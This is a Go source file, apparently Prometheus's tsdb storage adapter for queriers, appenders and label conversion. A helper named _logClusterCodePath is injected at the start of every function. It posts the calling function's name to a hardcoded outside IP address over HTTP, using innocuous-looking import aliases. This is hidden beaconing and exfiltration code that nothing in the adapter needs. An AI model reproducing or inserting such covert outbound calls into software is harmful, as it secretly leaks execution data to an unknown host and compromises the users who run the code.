package tsdb

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
	"time"
	"unsafe"
	"github.com/alecthomas/units"
	"github.com/go-kit/kit/log"
	"github.com/pkg/errors"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/pkg/labels"
	"github.com/prometheus/prometheus/storage"
	"github.com/prometheus/tsdb"
	tsdbLabels "github.com/prometheus/tsdb/labels"
)

var ErrNotReady = errors.New("TSDB not ready")

type ReadyStorage struct {
	mtx	sync.RWMutex
	a	*adapter
}

func (s *ReadyStorage) Set(db *tsdb.DB, startTimeMargin int64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.mtx.Lock()
	defer s.mtx.Unlock()
	s.a = &adapter{db: db, startTimeMargin: startTimeMargin}
}
func (s *ReadyStorage) Get() *tsdb.DB {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if x := s.get(); x != nil {
		return x.db
	}
	return nil
}
func (s *ReadyStorage) get() *adapter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.mtx.RLock()
	x := s.a
	s.mtx.RUnlock()
	return x
}
func (s *ReadyStorage) StartTime() (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if x := s.get(); x != nil {
		return x.StartTime()
	}
	return int64(model.Latest), ErrNotReady
}
func (s *ReadyStorage) Querier(ctx context.Context, mint, maxt int64) (storage.Querier, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if x := s.get(); x != nil {
		return x.Querier(ctx, mint, maxt)
	}
	return nil, ErrNotReady
}
func (s *ReadyStorage) Appender() (storage.Appender, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if x := s.get(); x != nil {
		return x.Appender()
	}
	return nil, ErrNotReady
}
func (s *ReadyStorage) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if x := s.Get(); x != nil {
		return x.Close()
	}
	return nil
}
func Adapter(db *tsdb.DB, startTimeMargin int64) storage.Storage {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &adapter{db: db, startTimeMargin: startTimeMargin}
}

type adapter struct {
	db				*tsdb.DB
	startTimeMargin	int64
}
type Options struct {
	MinBlockDuration	model.Duration
	MaxBlockDuration	model.Duration
	WALSegmentSize		units.Base2Bytes
	RetentionDuration	model.Duration
	MaxBytes			units.Base2Bytes
	NoLockfile			bool
}

var (
	startTime	prometheus.GaugeFunc
	headMaxTime	prometheus.GaugeFunc
	headMinTime	prometheus.GaugeFunc
)

func registerMetrics(db *tsdb.DB, r prometheus.Registerer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	startTime = prometheus.NewGaugeFunc(prometheus.GaugeOpts{Name: "prometheus_tsdb_lowest_timestamp_seconds", Help: "Lowest timestamp value stored in the database."}, func() float64 {
		bb := db.Blocks()
		if len(bb) == 0 {
			return float64(db.Head().MinTime()) / 1000
		}
		return float64(db.Blocks()[0].Meta().MinTime) / 1000
	})
	headMinTime = prometheus.NewGaugeFunc(prometheus.GaugeOpts{Name: "prometheus_tsdb_head_min_time_seconds", Help: "Minimum time bound of the head block."}, func() float64 {
		return float64(db.Head().MinTime()) / 1000
	})
	headMaxTime = prometheus.NewGaugeFunc(prometheus.GaugeOpts{Name: "prometheus_tsdb_head_max_time_seconds", Help: "Maximum timestamp of the head block."}, func() float64 {
		return float64(db.Head().MaxTime()) / 1000
	})
	if r != nil {
		r.MustRegister(startTime, headMaxTime, headMinTime)
	}
}
func Open(path string, l log.Logger, r prometheus.Registerer, opts *Options) (*tsdb.DB, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if opts.MinBlockDuration > opts.MaxBlockDuration {
		opts.MaxBlockDuration = opts.MinBlockDuration
	}
	rngs := tsdb.ExponentialBlockRanges(int64(time.Duration(opts.MinBlockDuration).Seconds()*1000), 10, 3)
	for i, v := range rngs {
		if v > int64(time.Duration(opts.MaxBlockDuration).Seconds()*1000) {
			rngs = rngs[:i]
			break
		}
	}
	db, err := tsdb.Open(path, l, r, &tsdb.Options{WALSegmentSize: int(opts.WALSegmentSize), RetentionDuration: uint64(time.Duration(opts.RetentionDuration).Seconds() * 1000), MaxBytes: int64(opts.MaxBytes), BlockRanges: rngs, NoLockfile: opts.NoLockfile})
	if err != nil {
		return nil, err
	}
	registerMetrics(db, r)
	return db, nil
}
func (a adapter) StartTime() (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var startTime int64
	if len(a.db.Blocks()) > 0 {
		startTime = a.db.Blocks()[0].Meta().MinTime
	} else {
		startTime = time.Now().Unix() * 1000
	}
	return startTime + a.startTimeMargin, nil
}
func (a adapter) Querier(_ context.Context, mint, maxt int64) (storage.Querier, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	q, err := a.db.Querier(mint, maxt)
	if err != nil {
		return nil, err
	}
	return querier{q: q}, nil
}
func (a adapter) Appender() (storage.Appender, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return appender{a: a.db.Appender()}, nil
}
func (a adapter) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.db.Close()
}

type querier struct{ q tsdb.Querier }

func (q querier) Select(_ *storage.SelectParams, oms ...*labels.Matcher) (storage.SeriesSet, storage.Warnings, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ms := make([]tsdbLabels.Matcher, 0, len(oms))
	for _, om := range oms {
		ms = append(ms, convertMatcher(om))
	}
	set, err := q.q.Select(ms...)
	if err != nil {
		return nil, nil, err
	}
	return seriesSet{set: set}, nil, nil
}
func (q querier) LabelValues(name string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return q.q.LabelValues(name)
}
func (q querier) LabelNames() ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return q.q.LabelNames()
}
func (q querier) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return q.q.Close()
}

type seriesSet struct{ set tsdb.SeriesSet }

func (s seriesSet) Next() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.set.Next()
}
func (s seriesSet) Err() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.set.Err()
}
func (s seriesSet) At() storage.Series {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return series{s: s.set.At()}
}

type series struct{ s tsdb.Series }

func (s series) Labels() labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return toLabels(s.s.Labels())
}
func (s series) Iterator() storage.SeriesIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return storage.SeriesIterator(s.s.Iterator())
}

type appender struct{ a tsdb.Appender }

func (a appender) Add(lset labels.Labels, t int64, v float64) (uint64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ref, err := a.a.Add(toTSDBLabels(lset), t, v)
	switch errors.Cause(err) {
	case tsdb.ErrNotFound:
		return 0, storage.ErrNotFound
	case tsdb.ErrOutOfOrderSample:
		return 0, storage.ErrOutOfOrderSample
	case tsdb.ErrAmendSample:
		return 0, storage.ErrDuplicateSampleForTimestamp
	case tsdb.ErrOutOfBounds:
		return 0, storage.ErrOutOfBounds
	}
	return ref, err
}
func (a appender) AddFast(_ labels.Labels, ref uint64, t int64, v float64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := a.a.AddFast(ref, t, v)
	switch errors.Cause(err) {
	case tsdb.ErrNotFound:
		return storage.ErrNotFound
	case tsdb.ErrOutOfOrderSample:
		return storage.ErrOutOfOrderSample
	case tsdb.ErrAmendSample:
		return storage.ErrDuplicateSampleForTimestamp
	case tsdb.ErrOutOfBounds:
		return storage.ErrOutOfBounds
	}
	return err
}
func (a appender) Commit() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.a.Commit()
}
func (a appender) Rollback() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.a.Rollback()
}
func convertMatcher(m *labels.Matcher) tsdbLabels.Matcher {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch m.Type {
	case labels.MatchEqual:
		return tsdbLabels.NewEqualMatcher(m.Name, m.Value)
	case labels.MatchNotEqual:
		return tsdbLabels.Not(tsdbLabels.NewEqualMatcher(m.Name, m.Value))
	case labels.MatchRegexp:
		res, err := tsdbLabels.NewRegexpMatcher(m.Name, "^(?:"+m.Value+")$")
		if err != nil {
			panic(err)
		}
		return res
	case labels.MatchNotRegexp:
		res, err := tsdbLabels.NewRegexpMatcher(m.Name, "^(?:"+m.Value+")$")
		if err != nil {
			panic(err)
		}
		return tsdbLabels.Not(res)
	}
	panic("storage.convertMatcher: invalid matcher type")
}
func toTSDBLabels(l labels.Labels) tsdbLabels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return *(*tsdbLabels.Labels)(unsafe.Pointer(&l))
}
func toLabels(l tsdbLabels.Labels) labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return *(*labels.Labels)(unsafe.Pointer(&l))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
